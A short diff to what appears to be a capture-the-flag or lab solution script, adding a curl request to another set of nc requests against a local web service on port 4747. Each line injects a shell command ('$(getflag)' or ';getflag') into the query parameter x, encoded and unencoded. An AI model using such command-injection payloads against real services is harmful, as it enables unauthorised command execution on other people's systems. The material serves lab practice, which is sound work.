@@ -13,3 +13,5 @@ echo -e "GET /?x=%24%28getflag%29 HTTP/1.1\nHost:localhost\n\n" | nc localhost 4
 # Without encoding
 echo -e 'GET /?x=$(getflag) HTTP/1.1\nHost:localhost\n\n' | nc localhost 4747
 
+# Using separation
+curl http://localhost:4747?x=%3Bgetflag
